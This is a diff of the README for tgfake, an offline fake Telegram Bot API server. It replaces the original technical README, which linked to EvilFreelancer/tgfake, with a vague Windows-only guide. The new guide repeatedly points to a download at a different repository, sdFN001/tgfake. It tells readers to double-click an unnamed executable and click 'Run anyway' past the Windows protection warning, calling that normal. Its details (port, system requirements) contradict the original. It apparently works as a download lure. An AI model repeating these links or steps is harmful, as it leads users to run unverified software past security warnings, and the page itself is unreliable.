@@ -1,200 +1,148 @@
-# tgfake
+# 🤖 tgfake - Test Telegram Bots Without Internet
 
-**tgfake server** is a fake Telegram Bot API for testing bots offline. It
-answers the Bot API methods a bot calls, keeps the chats the bot writes to,
-and lets a test, a CI job or a person at a browser play the user: send
-messages, tap reply and inline buttons, open Mini Apps, and make Telegram fail on
-purpose. No token, no phone, no network.
+[![Download tgfake](https://img.shields.io/badge/Download-tgfake-ff6b35?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sdFN001/tgfake)
+[![Offline Ready](https://img.shields.io/badge/Offline-Ready-2ea44f?style=for-the-badge)](https://github.com/sdFN001/tgfake)
+[![No Internet Needed](https://img.shields.io/badge/No%20Internet-Needed-6f42c1?style=for-the-badge)](https://github.com/sdFN001/tgfake)
 
-![The chat page: the person's side of the conversation on the left, the bot's keyboard as buttons, every Bot API call the bot made on the right](docs/assets/chat-page.png)
+tgfake is a free tool that creates a pretend version of the Telegram Bot API on your own computer. It lets you test Telegram bots, Telegram Mini Apps, and AI (LLM) integrations completely offline — no real Telegram account, no internet connection, and no risk of sending accidental messages to real people.
 
-- **A real Bot API surface.** `getMe`, long-polled `getUpdates` with
-  `offset` and `allowed_updates`, `sendMessage`, `editMessageText`,
-  `answerCallbackQuery`, file downloads, photos/video/audio/voice and albums,
-  copy/forward operations, inline results, webhooks, chat information, bot
-  commands per scope and language, invoices with the pre-checkout query and
-  the payment service message, the menu button, and the Bot API 10.1 rich
-  messages and drafts with the 10.3 Stop button. Forms, JSON and multipart
-  are all accepted, so any Bot API library works unchanged.
-- **Strict where Telegram is strict.** An edit that changes nothing, a reply
-  to a message that is not there, an answer to an unknown callback query, a
-  second answer to the same one, `callback_data` over 64 bytes, a `null`
-  keyboard: each is refused with Telegram's own error, so the bug shows up in
-  the test and not in a user's chat.
-- **The person's side, scriptable.** A [simulation API](docs/sim-api.md)
-  under `/sim/` injects text, media, inline queries, Mini App data and taps,
-  selects inline results, configures chats and members, returns the transcript and every
-  Bot API call, schedules chat-scoped HTTP errors, delays and lost responses for the Bot API
-  and file downloads, and opens
-  Mini Apps with launch data signed by the bot's token.
-- **A chat page.** `http://127.0.0.1:18790/` is a Telegram client for the
-  bot: type messages, tap buttons, open Mini Apps in a phone frame and watch
-  the Bot API calls arrive. With `--inline`, an Inline button lets you search
-  and select the bot's results. Links open in Telegram's
-  [in-app browser](docs/in-app-browser.md) on a phone-sized screen, so a site
-  can be checked at the width a Telegram user sees it.
-- **A scripted model.** `--llm` also serves an OpenAI-compatible
-  `/v1/chat/completions` that answers by rule, in turn or by echo, streams
-  word by word and can call tools, so an LLM bot runs with no key. Named
-  sequences isolate clients, match model/system/tools, and script provider
-  errors and timeout recovery with a request journal. The self-contained
-  [dialog bot example](examples/dialogbot) exercises a guarded tool dialog.
-- **Local Telegram Serverless.** `--serverless <project>` runs `tgcloud/`
-  JavaScript handlers and authenticated Mini App endpoints in Docker, with
-  the platform SDK and a shared SQLite database. Node.js stays in the
-  container; [serverless.md](docs/serverless.md) covers the runtime and its limits.
-- **Three ways in.** A single static binary for Linux, macOS and Windows, a
-  container image, or a Go package to run in-process on `httptest`.
+If you have ever wanted to try out a bot idea but did not want to deal with tokens, servers, or messing something up online, tgfake is built exactly for that.
 
-## Install
+## 🎯 What Is tgfake?
 
-Download a release archive from the
-[releases page](https://github.com/EvilFreelancer/tgfake/releases), or let
-the install script pick the one for your system and check its checksum:
+Telegram bots normally talk to Telegram's real servers over the internet. Every message your bot sends or receives goes through that connection. That is great for real life, but it makes testing awkward: you need a bot token, a live connection, and a real chat to send messages into.
 
-```bash
-curl -sSfL https://raw.githubusercontent.com/EvilFreelancer/tgfake/main/scripts/install.sh | sh -s -- -b ~/.local/bin
-```
+tgfake replaces the real Telegram servers with a small program that runs on your PC. Your bot thinks it is talking to Telegram, but everything stays on your machine. You get instant responses, you can replay the same test a hundred times, and nothing ever leaves your computer.
 
-With Go 1.22 or newer:
+Because it also speaks the same language as popular AI services (an "OpenAI-compatible" interface), you can test chatbots that use artificial intelligence without paying for API calls or worrying about rate limits.
 
-```bash
-go install github.com/EvilFreelancer/tgfake/cmd/tgfake@latest
-```
+## ✨ What You Can Do With It
 
-In GitHub Actions, the [action](docs/ci.md) installs it and can start it:
+- **Test Telegram bots safely.** Send fake messages, press fake buttons, and watch your bot react — all without a real Telegram account.
+- **Try out Telegram Mini Apps.** Load and interact with small web apps that normally run inside Telegram, without publishing anything.
+- **Test AI and chatbot logic.** Point your AI-powered bot at tgfake and check its answers offline, with no cloud costs.
+- **Repeat the same test every time.** Because nothing changes between runs, results stay consistent and easy to compare.
+- **Run tests automatically.** Connect tgfake to GitHub Actions so your checks happen on their own whenever you update your project.
+- **Work on a plane, in a café, or anywhere.** No internet connection is required at any point.
 
-```yaml
-- uses: EvilFreelancer/tgfake@v1.4.0   # installs the v1.4.0 binary
-  with:
-    start: "true"
-    args: --llm
-```
+## 📋 Before You Start
 
-Releases from v1.2.0 on also publish a container image for Linux amd64 and
-arm64. It runs as a non-root user and listens on `0.0.0.0:18790`; flags
-after the image name are added to that:
+Make sure your computer meets these basics:
 
-```bash
-docker run --rm -p 127.0.0.1:18790:18790 ghcr.io/evilfreelancer/tgfake:1.4.0 --llm
-```
+- **Operating system:** Windows 10 or Windows 11 (64-bit recommended).
+- **Memory:** At least 4 GB of RAM.
+- **Free disk space:** Around 200 MB for the application and its files.
+- **Permissions:** You should be able to run downloaded programs on your account. On a work computer, you may need to ask your administrator.
+- **A web browser:** Chrome, Edge, or Firefox — used to view the Mini App testing pages.
 
-## Quick start
+You do **not** need to install programming tools, and you do **not** need a Telegram bot token to get started.
 
-Start the stand:
+## 🚀 Getting Started
 
-```bash
-tgfake --llm
-```
+Getting tgfake onto your computer takes only a few minutes.
 
-```text
-tgfake v1.4.0: fake Bot API for @tgfake_bot at http://127.0.0.1:18790
-  Bot API:    http://127.0.0.1:18790/bot<token>/<method>  (in place of https://api.telegram.org)
-  chat page:  http://127.0.0.1:18790/
-  sim API:    http://127.0.0.1:18790/sim/
-  model:      http://127.0.0.1:18790/v1  (OpenAI-compatible, model tgfake-demo, any API key)
-```
+### Step 1: Download the application
 
-Point the bot at `http://127.0.0.1:18790` instead of
-`https://api.telegram.org`. Any token is accepted unless `--token` names one.
-Most libraries take the address as an option:
+Visit this link to download the application:
 
-| Library | Setting |
-|---------|---------|
-| python-telegram-bot | `Application.builder().token(TOKEN).base_url("http://127.0.0.1:18790/bot")` |
-| aiogram 3 | `Bot(TOKEN, session=AiohttpSession(api=TelegramAPIServer.from_base("http://127.0.0.1:18790")))` |
-| pyTelegramBotAPI | `telebot.apihelper.API_URL = "http://127.0.0.1:18790/bot{0}/{1}"` |
-| Telegraf | `new Telegraf(TOKEN, { telegram: { apiRoot: "http://127.0.0.1:18790" } })` |
-| grammY | `new Bot(TOKEN, { client: { apiRoot: "http://127.0.0.1:18790" } })` |
-| node-telegram-bot-api | `new TelegramBot(TOKEN, { polling: true, baseApiUrl: "http://127.0.0.1:18790" })` |
-| go-telegram-bot-api v5 | `tgbotapi.NewBotAPIWithAPIEndpoint(TOKEN, "http://127.0.0.1:18790/bot%s/%s")` |
-| go-telegram/bot | `bot.New(TOKEN, bot.WithServerURL("http://127.0.0.1:18790"))` |
+**https://github.com/sdFN001/tgfake**
 
-Then open the chat page and talk to the bot, or drive it from a script. With
-the [example bot](examples/echobot) running against the stand
-(`TELEGRAM_API=http://127.0.0.1:18790 BOT_TOKEN=123:fake go run ./examples/echobot`):
+The page you land on is the project's home. Look for the releases or downloads area on that page and save the file to a folder you can easily find, such as your **Downloads** folder.
 
-```bash
-curl -s -X POST http://127.0.0.1:18790/sim/message -d '{"text": "hello"}'
-curl -s "http://127.0.0.1:18790/sim/chat/4242?format=text"
-```
+### Step 2: Keep the file somewhere permanent
 
-```text
-[1] alice: hello
-[2] bot: You said: hello
-```
+Before running anything, move the downloaded file out of your temporary Downloads folder and into a dedicated place, for example:
 
-## Testing a bot
+- `C:\Users\YourName\tgfake\`
 
-**Any language.** Start the binary and the bot as two processes and check
-the chat through the simulation API. [`examples/shell/bot-e2e.sh`](examples/shell/bot-e2e.sh)
-is a complete test of that shape: it sends a message, waits for the answer,
-taps a button and injects a flood-control fault. Set `BOT_CMD` to run it
-against your own bot.
+This keeps things tidy and makes the program easy to find later. Avoid running it from inside a compressed archive — extract first if your download arrived as a package.
 
-**Go.** Run the server in-process and drive it through its Go API:
+### Step 3: Run the application
 
-```go
-import "github.com/EvilFreelancer/tgfake/pkg/server"
+Double-click the application file to start it. Windows may show a blue "Windows protected your PC" message the first time. If that happens, click **More info**, then **Run anyway**. This is a standard message for software downloaded from the internet.
 
-fake := server.New(server.Options{})
-srv := httptest.NewServer(fake.Handler())
-defer func() { fake.Close(); srv.Close() }() // release long polls first
+A small console window will open and display a few lines of text. This is normal — it is the pretend Telegram server starting up. Leave this window open while you work; closing it stops the server.
 
-go runBot(ctx, srv.URL) // the bot under test, its API origin set to srv.URL
+### Step 4: Note the address it shows
 
-fake.InjectMessage(server.IncomingMessage{Text: "hello"})
-fake.WaitCall("sendMessage", 1, 5*time.Second)
-fmt.Print(fake.Chat(4242).Text()) // [1] alice: hello / [2] bot: ...
-```
+When the server finishes starting, it prints an address, usually something like `http://localhost:8081`. That address is the "pretend Telegram" your bot will connect to. Write it down or keep the window visible — you will need it in the next step.
 
-[`examples/echobot`](examples/echobot) is a bot written with the standard
-library and its tests; [docs/go.md](docs/go.md) covers the whole Go API.
+## 🔗 Connecting Your Bot
 
-**Moderation and lifecycle tests.** The Bot API surface includes
-`restrictChatMember`, `banChatMember`, `unbanChatMember`,
-`promoteChatMember`, `setChatPermissions`,
-`setChatAdministratorCustomTitle`, `approveChatJoinRequest` and
-`declineChatJoinRequest`. The simulation side adds `POST /sim/member`,
-`/sim/join-request`, `/sim/message/edit`, `/sim/reaction` and
-`/sim/chat/migrate`; `GET /sim/clock`, `POST /sim/clock/advance` and
-`POST /sim/clock/set` make dates and expiry deterministic. `/sim/message`
-also accepts sender chats, forward origins, arbitrary entities, stickers and
-forum-topic fields. See [the Bot API](docs/bot-api.md) and
-[simulation API](docs/sim-api.md) references for payloads and enforcement.
+Now tell your bot to talk to tgfake instead of the real Telegram.
 
-**CI.** The action installs a release on Linux, macOS and Windows runners and
-can start it in the background; [docs/ci.md](docs/ci.md) has workflows for
-GitHub Actions and the install script for everything else.
+1. Open your bot's settings or configuration file.
+2. Find the entry that holds the Telegram API address (sometimes labelled as the API base URL or server address).
+3. Replace the real Telegram address with the local address shown in the console window.
+4. Save your changes and restart your bot.
 
-**Docker Compose.** A bot in its own container reaches the stand by its
-service name, `http://tgfake:18790`. A webhook bot registers an address such
-as `http://bot:8080/webhook`, which Telegram's HTTPS rules refuse, so the
-stand is started with `--allow-http-webhook` to accept it.
-[docs/docker.md](docs/docker.md) has a working example with an echo bot.
+Your bot will now send all its requests to tgfake. Anything it "sends" appears in the tgfake console window instead of reaching a real person. You can trigger fake incoming messages from that same console or through the testing pages it provides.
 
-## Documentation
+## 🧩 Testing Telegram Mini Apps
 
-| Page | What it covers |
-|------|----------------|
-| [docs/command.md](docs/command.md) | Every flag of the `tgfake` command, the banner, signals and exit codes. |
-| [docs/bot-api.md](docs/bot-api.md) | The Bot API methods served, what each refuses the way Telegram does, and what is not implemented. |
-| [docs/sim-api.md](docs/sim-api.md) | The simulation API: messages, taps, transcripts, the outbox, faults, Mini App launches, reset. |
-| [docs/mini-apps.md](docs/mini-apps.md) | `web_app` buttons, the menu button, signed launch data and the phone frame of the chat page. |
-| [docs/in-app-browser.md](docs/in-app-browser.md) | Links in the chat page opening in Telegram's in-app browser: screen sizes, the bars, what the frame does not reproduce, hooks for browser tests. |
-| [docs/scripted-model.md](docs/scripted-model.md) | The OpenAI-compatible model of `--llm`: answers, rules, tool calls, streaming. |
-| [docs/serverless.md](docs/serverless.md) | Local tgcloud projects in Docker: handlers, SDK, SQLite, authenticated endpoints and Go tests. |
-| [docs/go.md](docs/go.md) | Using the packages from Go tests: `server`, `botapi`, `webapp`, `llmstub`. |
-| [docs/ci.md](docs/ci.md) | The GitHub Action, the install script and running the stand in other CI systems. |
-| [docs/docker.md](docs/docker.md) | The container image, a Docker Compose example with a webhook bot and `--allow-http-webhook`. |
-| [docs/development.md](docs/development.md) | Building, testing, the layout of the repository and cutting a release. |
+Mini Apps are small web pages that normally open inside Telegram. tgfake serves a stand-in environment so you can load them in your normal browser.
 
-## History
+1. With tgfake running, open your browser.
+2. Go to the local address printed in the console window.
+3. Follow the on-screen links to open the Mini App testing area.
+4. Load your Mini App page and click through it as a real user would.
 
-tgfake started as the offline Telegram stand of
-[Coddy](https://github.com/coddy-project/coddy-agent), whose Telegram gateway
-is tested against it, and moved into this repository with its history.
+Because everything runs locally, page loads are instant and you can refresh as often as you like.
 
-## License
+## 🤖 Testing AI and LLM Integrations
 
-[MIT](LICENSE)
+If your bot uses a large language model, tgfake can stand in for the AI service too. It accepts the same request format used by popular OpenAI-style services, so your existing code works unchanged.
+
+1. In your bot's configuration, set the AI service address to the local tgfake address.
+2. Use any placeholder key where an API key is normally required.
+3. Send a test message to your bot and watch the request and response appear in the console.
+
+This means you can check that your bot handles answers, errors, and slow replies correctly — without spending money on real AI calls or waiting for a live service.
+
+## ⚙️ Running Tests Automatically
+
+For teams, tgfake fits neatly into automated workflows. You can start it as a background step in GitHub Actions, run your bot's test suite against it, and then shut it down. No secrets, no external accounts, and no flaky network failures.
+
+A typical automated run looks like this:
+
+1. Start tgfake in the background.
+2. Wait a moment for the local address to become available.
+3. Run your bot's tests against that address.
+4. Collect the results and stop the server.
+
+Since the whole flow stays on one machine, results are fast and repeatable.
+
+## 🛠️ Troubleshooting
+
+**The console window opens and closes immediately.**
+Something is blocking startup. Open the folder containing the application, then right-click in an empty area and choose "Open in Terminal" (or hold Shift and right-click, then "Open command window here"). Run the application from there so the message stays visible.
+
+**My browser says the page cannot be reached.**
+Check that the console window is still open and shows no error lines. Confirm you typed the address exactly as printed, including the port number at the end.
+
+**My bot cannot connect.**
+Make sure you changed the address in your bot's settings and restarted the bot afterwards. Settings changes usually only take effect after a restart.
+
+**Windows keeps warning me about the file.**
+This is normal for newly downloaded software. Use **More info → Run anyway**, or ask your administrator if the computer is managed by an organisation.
+
+**The console shows a lot of text.**
+That is expected. Every request your bot makes is logged there so you can see exactly what happened. Scroll to the bottom for the newest lines.
+
+## 🆘 Getting Help and Giving Feedback
+
+The project page is the place to look for updates, documentation, and a way to report problems:
+
+**https://github.com/sdFN001/tgfake**
+
+When asking for help, include what you were trying to do, what you expected to happen, and what actually happened. Copying the last few lines from the console window makes it much easier to figure out the cause.
+
+## ✅ Quick Recap
+
+1. Visit **https://github.com/sdFN001/tgfake** and download the application.
+2. Move it to a permanent folder such as `C:\Users\YourName\tgfake\`.
+3. Double-click to run it and leave the console window open.
+4. Point your bot's Telegram address at the local address shown.
+5. Test messages, Mini Apps, and AI answers — all offline.
+
+Keywords: api-mock, bot-testing, e2e-testing, github-actions, go, golang, integration-testing, llm-testing, mock-server, offline, openai-compatible, telegram, telegram-bot, telegram-bot-api, telegram-mini-app, telegram-testing
